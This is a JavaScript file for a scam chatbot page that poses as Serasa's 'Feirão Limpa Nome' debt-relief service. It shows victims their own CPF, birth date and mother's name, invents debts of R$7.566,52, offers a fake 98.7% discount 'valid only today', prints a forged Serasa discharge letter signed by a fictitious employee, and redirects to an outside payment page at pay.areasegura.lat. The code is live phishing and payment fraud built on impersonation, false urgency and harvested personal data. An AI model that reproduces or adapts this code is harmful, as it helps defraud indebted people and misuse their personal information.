clicou = false

function iHaveTelegram() { }

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Função utilitária para aguardar um determinado tempo (em milissegundos)
function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}

let userCity = 'sua região'; // fallback padrão

async function getUserCity() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        if (data.city) {
            userCity = data.city;
        }
    } catch (error) {
        console.log("Erro ao obter cidade:", error);
    }
}


async function ola() {
    await getUserCity(); // garante que a cidade já foi carregada

    const charRate = 40; // tempo (ms) por caractere
    const extraDelay = 2000; // tempo extra para garantir que o efeito de escrita tenha terminado

    addImg('images/t2s1f0xeh3om35z9nrjnb7jf.png')
    await delay(extraDelay + extraDelay);

    // Primeiro texto
    const text1 = `Uma atendente da região de ${userCity} acaba de entrar na conversa`;
    addTextInChat(text1);
    await delay(text1.length * charRate + extraDelay);

    // Segundo texto
    const text2 = "Olá me chamo Patrícia, serei sua atendente hoje na Serasa.";
    addTextInChat(text2);
    await delay(text2.length * charRate + extraDelay);

    // Terceiro texto
    const text3 = "Consulte gratís as ofertas disponíveis para você!";
    addTextInChat(text3);
    await delay(text3.length * charRate + extraDelay);

    // Quarto texto
    const text4 = "Estou verificando seus dados, aguarde....";
    addTextInChat(text4);
    await delay(text4.length * charRate + extraDelay);

    addImg('images/r03zqdcbcd7t0h9lsuxzcl9r.gif')
    await delay(extraDelay + extraDelay + 2000);

    // Quinto texto
    const text5 = "Dados verificados com sucesso...";
    addTextInChat(text5);
    await delay(text5.length * charRate + extraDelay);


    var nome = localStorage.getItem('nome');
    var nasc = localStorage.getItem('data_nascimento');
    var nomeMae = localStorage.getItem('nome_mae') || 'Nome da mãe não disponível';
    var cpf = localStorage.getItem('cpf_limpo')
    var sexo = localStorage.getItem('sexo')


    const text6 = `<b>Antes de prosseguirmos, confirme se seus dados estão corretos:</b>

    <b>Nome:</b>
    ${nome}
    <b>Identificação(CPF):</b>
    ${cpf}
    <b>Data de Nascimento:</b>
    ${nasc}
    <b>Nome da Mãe:</b>
    ${nomeMae}
    <b>Sexo:</b>
    ${sexo}`
    addTextInChat(text6);
    await delay(text6.length * charRate + extraDelay);


    // Botões de resposta
    addButtonToChat('Confirmar', consultar, 'larger');
}

async function consultar() {
    const charRate = 40; // tempo (ms) por caractere
    const extraDelay = 2000; // tempo extra para garantir que o efeito de escrita tenha terminado
    var nome = localStorage.getItem('nome');

    const text1 = `<b>${nome}</b>, Seja Bem vindo(a) ao atendimento <b>Feirão Limpa Nome Serasa!</b>`;
    addTextInChat(text1);
    await delay(text1.length * charRate + extraDelay);

    const text2 = `Protocolo de atendimento:
<b>AMSLDK23</b>`;
    addTextInChat(text2);
    await delay(text2.length * charRate + extraDelay);

    addImg('images/o664tn1fbgjcggkvqlevdsgo.png')
    await delay(extraDelay + extraDelay + 2000);

    const text3 = `Ultimo dia do Feirão limpa nome na sua região. Deseja consultar as ofertas disponíveis para  o seu <b>CPF</b>?`;
    addTextInChat(text3);
    await delay(text3.length * charRate + extraDelay);

    addButtonToChat('Quero Consultar', analise, 'larger');
}


async function analise() {
    const charRate = 40; // tempo (ms) por caractere
    const extraDelay = 2000; // tempo extra para garantir que o efeito de escrita tenha terminado
    var nome = localStorage.getItem('nome');
    var cpf = localStorage.getItem('cpf');

    const text1 = `Por favor, aguarde enquanto analiso a situação  de seu <b>CPF</b> em nosso sistema...`;
    addTextInChat(text1);
    await delay(text1.length * charRate + extraDelay);

    const tempoVideo = 340; // duração do vídeo (ms)
    addVideoToChat("images/WhatsApp Video 2025-07-06 at 15.24.14.mp4", true);
    await delay(tempoVideo + extraDelay);

    const text2 = `Análise concluída!`;
    addTextInChat(text2);
    await delay(text2.length * charRate + extraDelay);

    const text3 = `<b>${nome}</b>,identifiquei 3 dívidas ativas no sistema . Os valores variam entre <b>R$528,74</b> a <b>R$5.237,78</b>, totalizando uma dívida ativa  de R$7.566,52 em seu CPF

Situação  para CPF: ${cpf}
<b>NEGATIVADO</b>`;
    addTextInChat(text3);
    await delay(text3.length * charRate + extraDelay);

    const text4 = `Devido a alta taxa de juros imposta pelo governo, suas dívidas estão se multiplicando rapidamente!`;
    addTextInChat(text4);
    await delay(text4.length * charRate + extraDelay);

    const tempoVideo2 = 7000; // duração do vídeo (ms)
    addAudioToChat("images/mwK3zhz9OwzNVolLgEPkUUXUyhcd2nJC.mp3", true);
    await delay(tempoVideo2 + extraDelay);

    const tempoVideo3 = 340; // duração do vídeo (ms)
    addVideoToChat("images/score.mp4", true);
    await delay(tempoVideo3 + extraDelay);

    const text5 = `Deseja verificar se existe algum acordo disponível para você?`;
    addTextInChat(text5);
    await delay(text5.length * charRate + extraDelay);

    addButtonToChat('Sim, desejo!', oferta, 'larger');
}

async function oferta() {
    const now = new Date();
    const dia = String(now.getDate()).padStart(2, '0');       // Dia com 2 dígitos
    const mes = String(now.getMonth() + 1).padStart(2, '0');  // Mês com 2 dígitos (Janeiro é 0)
    const date = `${dia}/${mes}`;
    const charRate = 40; // tempo (ms) por caractere
    const extraDelay = 2000; // tempo extra para garantir que o efeito de escrita tenha terminado
    var nome = localStorage.getItem('nome');
    var cpf = localStorage.getItem('cpf');

    const text1 = `Aguarde um instante enquanto  verifico aqui no sistema se existem acordos dísponiveis para você...`
    addTextInChat(text1);
    await delay(text1.length * charRate + extraDelay);

    const tempoVideo = 8000; // duração do vídeo (ms)
    addVideoToChat("images/WhatsApp Video 2025-07-06 at 15.26.09.mp4", true);
    await delay(tempoVideo + extraDelay);

    const text2 = `Notícia: Somente hoje, mais de <b>12.872 mil brasileiros</b> negociaram suas dívidas no Feirão Limpa Nome Serasa online! `
    addTextInChat(text2);
    await delay(text2.length * charRate + extraDelay);

    const tempoVideo2 = 18000; // duração do vídeo (ms)
    addVideoToChat("images/577021724-664603497-ScreenRecording_07-06-2025_19-37-51_1.mp4.mp4", true, true); // o terceiro argumento ativa o som
    await delay(tempoVideo2 + extraDelay);


    const text3 = `<b>Acordo encontrado!</b>

1(um) acordo foi encontrado para   (CPF ${cpf})`
    addTextInChat(text3);
    await delay(text3.length * charRate + extraDelay);

    const text4 = `Acessando acordo, <b>83N2L618362E</b>  aguarde...`
    addTextInChat(text4);
    await delay(text4.length * charRate + extraDelay);

    const text5 = `Informações de acordo
83N2L618362E para <b>${nome}</b>, (CPF <b>${cpf}</b>):

<b>Acordo:</b> 83N2L618362E
<b>Valor Total da Dívida:</b> R$
7.566,52

Valor do Acordo: <b>R$ 78,47</b>
Desconto Total: 98,7%
Data de Vencimento:
hoje, ${date}

O contrato atual é válido
apenas para o titular: <b>${nome}</b>
do CPF <b>${cpf}</b>`
    addTextInChat(text5);
    await delay(text5.length * charRate + extraDelay);

    addImg('images/download.png')
    await delay(extraDelay + extraDelay);

    const tempoVideo3 = 20000; // duração do vídeo (ms)
    addAudioToChat("images/0hbWRs2Lex4OEqNOQp5OaZS1RMJcfIx0.mp3", true);
    await delay(tempoVideo3 + extraDelay);

    const text6 = `Deseja realizar o acordo e ter seu nome limpo ainda hoje?`
    addTextInChat(text6);
    await delay(text6.length * charRate + extraDelay);

    addButtonToChat('Sim, Quero Quitar Minhas Dívidas', final, 'larger');
}







async function final() {
    const now = new Date();
    const dia = String(now.getDate()).padStart(2, '0');       // Dia com 2 dígitos
    const mes = String(now.getMonth() + 1).padStart(2, '0');  // Mês com 2 dígitos (Janeiro é 0)
    const date = `${dia}/${mes}`;
    const charRate = 40;
    const extraDelay = 2000;
    var nome = localStorage.getItem('nome');
    var cpf = localStorage.getItem('cpf');

    const text1 = "Confirmando acordo..."
    addTextInChat(text1);
    await delay(text1.length * charRate + extraDelay);

    const text2 = `<b>SERASA INFORMA:</b> Ao efetuar o pagamento do acordo, todas as dívidas em aberto no CPF <b>${cpf}</b> serão removidas em 1 hora, e você terá o seu nome limpo novamente!`
    addTextInChat(text2);
    await delay(text2.length * charRate + extraDelay);

    const text3 = `<i>Parabéns!</i> Seu acordo foi confirmado✅`
    addTextInChat(text3);
    await delay(text3.length * charRate + extraDelay);

    const tempoVideo3 = 22000; // duração do vídeo (ms)
    addAudioToChat("images/Dt5vEkWZ9l14f3HODeVNtGFpDMLorgfB.mp3", true);
    await delay(tempoVideo3 + extraDelay);

    const text4 = `<b>Gerando guia de pagamento...</b>`
    addTextInChat(text4);
    await delay(text4.length * charRate + extraDelay);

    const text5 = `SERASA
Carta de Quitação
Na qualidade de Serasa, com base na prestação de serviços realizados ao Sr./Sra. ${nome}, portador(a) do CPF ${cpf}, informamos que:

O serviço será realizado com base no programa do Feirão Limpa Nome, onde o(a) mesmo(a) obteve um desconto de 98,7% na quitação de todos os débitos em aberto.
<b>Detalhes da dívida</b>
Acordo: Gerido e processado pela Serasa.
<b>Valor total: R$ 78,47.</b>
Forma de pagamento: PIX.
<b>Acordo valido somente hoje:</b> ${date}
Agora, depois que a Serasa Experian recebeu o pagamento devido, em conformidade com o acima referenciado de forma de pagamento, declaro aqui a quitação completa e absoluta da dívida.

Renata Paiva de Almeida
Encarregada de Negociações
Serasa Experian

© 2025 Serasa Experian. Todos os direitos reservados.`
    addTextInChat(text5);
    await delay(text5.length * charRate + extraDelay);

    const text6 = `A guia de pagamento foi
gerada para o acordo
83N2L618362E!

Beneficiario(a): <b>${nome}</b>
Identificação (CPF): <b>${cpf}</b>

<b>Clique no botão a seguir para acessar a guia de pagamento</b>`
    addTextInChat(text6);
    await delay(text6.length * charRate + extraDelay);



    addButtonToChat('ACESSAR ÁREA DE PAGAMENTO SEGURO 🔒', checkout, 'larger');
}




function checkout() {
    window.location.href = 'https://pay.areasegura.lat/kYL6geWkleAZrKM'
}

function addTimeToDiv(content) {
    var tm = document.createElement('div');
    tm.setAttribute("id", "time");
    var today = new Date();
    var time = today.getDate() + "/" + (today.getMonth() + 1) + '/' + today.getFullYear() + " " + today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();

    tm.innerHTML = time;
    content.appendChild(tm);
}

function scrollDown() {
    var objDiv = document.getElementById("chatbox");
    objDiv.scrollTop = objDiv.scrollHeight + 100;

    window.scrollTo(0, document.body.scrollHeight);
}

function addAudioToChat(audioURL, size) {
    var textElement = document.createElement('div');
    textElement.setAttribute("id", "chat-text-audio");

    if (size) {
        textElement.setAttribute("class", "chat-text-audio-larger");
    }
    textElement.classList.add("textConversaAudio");

    // Wrapper opcional para controle de largura e estilo
    var audioWrapper = document.createElement('div');
    audioWrapper.style.width = "100%";
    audioWrapper.style.maxWidth = "360px";
    audioWrapper.style.borderRadius = "10px";
    audioWrapper.style.overflow = "hidden";
    audioWrapper.style.padding = "5px 0";

    // Elemento de áudio
    var audio = document.createElement('audio');
    audio.src = audioURL;
    audio.autoplay = true;
    audio.controls = true;
    audio.style.width = "100%";
    audio.style.outline = "none";
    audio.style.display = "block";
    audio.style.border = "none";

    audioWrapper.appendChild(audio);
    textElement.appendChild(audioWrapper);
    document.getElementById("chatbox").appendChild(textElement);

    scrollDown();
}



function addVideoToChat(videoURL, size, comSom = false) {
    var textElement = document.createElement('div');
    textElement.setAttribute("id", "chat-text-video");

    if (size) {
        textElement.setAttribute("class", "chat-text-video-larger");
    }
    textElement.classList.add("textConversaVideo");

    var videoWrapper = document.createElement('div');
    videoWrapper.style.width = "100%";
    videoWrapper.style.maxWidth = "360px";
    videoWrapper.style.borderRadius = "10px";
    videoWrapper.style.overflow = "hidden";

    var video = document.createElement('video');
    video.src = videoURL;
    video.autoplay = true;
    video.muted = !comSom;
    video.playsInline = true;
    video.loop = true;
    video.controls = comSom; // mostra controles apenas se comSom for true
    video.style.width = "100%";
    video.style.height = "auto";
    video.style.display = "block";
    video.style.border = "none";
    video.style.objectFit = "cover";

    videoWrapper.appendChild(video);
    textElement.appendChild(videoWrapper);
    document.getElementById("chatbox").appendChild(textElement);

    scrollDown();
}


function addLinkInChat(text, link) {


    var textElement = document.createElement('div');
    textElement.setAttribute("id", "chat-text");
    textElement.classList.add("textConversa");



    var p = document.createElement('p');

    textElement.appendChild(p);

    document.getElementById("chatbox").appendChild(textElement);

    var a = document.createElement('a');
    a.setAttribute("href", link);

    textElement.appendChild(a);

    typeWriter(text, a);

    // addTimeToDiv(textElement);

    // avatar.scrollIntoView();
    scrollDown();
}

function addImg(link) {
    var imgElement = document.createElement('div');
    imgElement.setAttribute("id", "chat-text-image");
    imgElement.setAttribute("class", "chat-text-image-larger");

    imgElement.classList.add("textConversa");

    var img = document.createElement('img');
    img.setAttribute("id", "img");
    img.setAttribute("src", link);

    imgElement.appendChild(img);


    document.getElementById("chatbox").appendChild(imgElement);

}

function addComprovante(link) {
    var imgElement = document.createElement('div');
    imgElement.setAttribute("id", "chat-text-comprovante");
    imgElement.setAttribute("class", "chat-text-comprovante-larger");

    imgElement.classList.add("textConversa");

    var img = document.createElement('img');
    img.setAttribute("id", "img");
    img.setAttribute("src", link);

    imgElement.appendChild(img);


    document.getElementById("chatbox").appendChild(imgElement);

}



function addInputText(func) {

    var div = document.createElement('div');
    div.setAttribute("id", "chat-user-text");

    var input = document.createElement('input');
    input.setAttribute("id", "input-text")
    input.setAttribute("placeholder", 'Digite sua chave pix')
    input.classList.add("inputStyle");

    div.appendChild(input);

    var div2 = document.createElement('div');
    div2.setAttribute("id", "chat-user-button");

    var button = document.createElement('button');
    button.classList.add("form-control");
    button.innerHTML = "Enviar";
    button.onclick = func

    div2.appendChild(button);

    document.getElementById("chatbox").appendChild(div);

    document.getElementById("chatbox").appendChild(div2);
}

function addInputNumber(func, placeholder, val) {

    var div = document.createElement('div');
    div.setAttribute("id", "chat-user-text");

    var input = document.createElement('input');
    input.setAttribute("id", "input-number")
    input.setAttribute("placeholder", placeholder)
    input.classList.add("inputStyle");
    input.classList.add(val);
    input.classList.add("phone_with_ddd");

    div.appendChild(input);

    var div2 = document.createElement('div');
    div2.setAttribute("id", "chat-user-button");

    var button = document.createElement('button');
    button.classList.add("form-control");
    button.innerHTML = "Enviar";
    button.onclick = func

    div2.appendChild(button);

    document.getElementById("chatbox").appendChild(div);

    document.getElementById("chatbox").appendChild(div2);
}

function addButtonToChat(text, func, size) {
    var bt = document.createElement("button");
    bt.setAttribute("class", size);
    bt.innerHTML = text;

    // Quando o botão for clicado, ele adiciona a classe "ativo"
    bt.onclick = function () {
        // Adiciona a classe "ativo" ao botão clicado
        bt.classList.add("ativo");

        // Chama a função que foi passada como parâmetro (caso tenha alguma lógica associada)
        func();

        // Aqui você pode colocar qualquer lógica adicional para lidar com o botão "ativo"
    };

    var div = document.createElement('div');
    div.setAttribute("id", "chat-user-button");

    div.appendChild(bt);
    document.getElementById("chatbox").appendChild(div);

    // Scroll automático para baixo
    scrollDown();
}


function addTextInChat(text) {
    const delay = ms => new Promise(res => setTimeout(res, ms));
    var chatbox = document.getElementById("chatbox");
    if (!chatbox) {
        console.error("O elemento #chatbox não foi encontrado.");
        return;
    }
    var textElement = document.createElement('div');
    textElement.setAttribute("id", "chat-text");
    textElement.classList.add("textConversa");
    var p = document.createElement('p');
    textElement.appendChild(p);
    chatbox.appendChild(textElement);
    typeWriter(text, p);
    scrollDown();
}


function addTextInChatScroll(text) {
    const delay = ms => new Promise(res => setTimeout(res, ms));



    var textElement = document.createElement('div');
    textElement.setAttribute("id", "chat-text");
    textElement.classList.add("textConversa");



    var p = document.createElement('p');

    textElement.appendChild(p);
    document.getElementById("chatbox").appendChild(textElement);

    scrollDown()
    typeWriter(text, p);
    scrollDown()

}

function addUserTextInChat(text) {
    var textElement = document.createElement('div');
    textElement.setAttribute("id", "chat-user-text");

    var p = document.createElement('p');

    textElement.appendChild(p);

    document.getElementById("chatbox").appendChild(textElement);

    typeWriter(text, p);

    // textElement.scrollIntoView();
    scrollDown();

    var tm = document.createElement('div');
    tm.setAttribute("id", "time-user");
    var today = new Date();
    var time = today.getDate() + "/" + (today.getMonth() + 1) + '/' + today.getFullYear() + " " + today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();

    tm.innerHTML = time;
    textElement.appendChild(tm);
}

async function typeWriter(txt, div) {
    const delay = ms => new Promise(res => setTimeout(res, ms));

    // Altera o status para "Digitando..."
    const status = document.querySelector('.status-digitalizacao');
    if (status) status.innerText = 'Digitando...';

    // Mostra ícone de digitando
    div.innerHTML = `
        <div class="typing-indicator">
            <span></span><span></span><span></span>
        </div>`;

    await delay(2000);

    // IMPORTANTE: Cria um span para envolver todo o texto
    div.innerHTML = '<span class="text-content"></span>';
    const textSpan = div.querySelector('.text-content');

    // Separa o texto em partes: texto normal e tags HTML
    const parts = [];
    let currentText = '';
    let insideTag = false;
    let currentTag = '';

    for (let i = 0; i < txt.length; i++) {
        const char = txt.charAt(i);

        if (char === '<') {
            if (currentText) {
                parts.push({ type: 'text', content: currentText });
                currentText = '';
            }
            insideTag = true;
            currentTag = char;
        } else if (char === '>' && insideTag) {
            currentTag += char;
            parts.push({ type: 'tag', content: currentTag });
            currentTag = '';
            insideTag = false;
        } else if (insideTag) {
            currentTag += char;
        } else {
            currentText += char;
        }
    }

    if (currentText) {
        parts.push({ type: 'text', content: currentText });
    }

    // Agora digita as partes dentro do span
    let displayText = '';

    for (const part of parts) {
        if (part.type === 'tag') {
            // Adiciona a tag completa de uma vez
            displayText += part.content;
            textSpan.innerHTML = displayText;
        } else {
            // Digita o texto caractere por caractere
            for (let i = 0; i < part.content.length; i++) {
                displayText += part.content.charAt(i);
                textSpan.innerHTML = displayText;
                await delay(20);
            }
        }
    }

    // Volta o status para "Online"
    if (status) status.innerText = 'Online';
}



function linkFinal() {
    var div = document.createElement('div');
    div.setAttribute("id", "chat-user-text");
    div.classList.add("MensagemSuspeitaStyle");
    var bt = document.createElement("a");
    bt.setAttribute("id", "chat-user-text");
    bt.innerHTML = "Ver mensagens suspeitas agora";
    bt.href = 'https://checkout.payt.com.br/384cb854644425079baeec43aa82534f';

    div.appendChild(bt);

    document.getElementById("chatbox").appendChild(div);
    scrollDown();
}

document.addEventListener("DOMContentLoaded", function () {
    ola();
});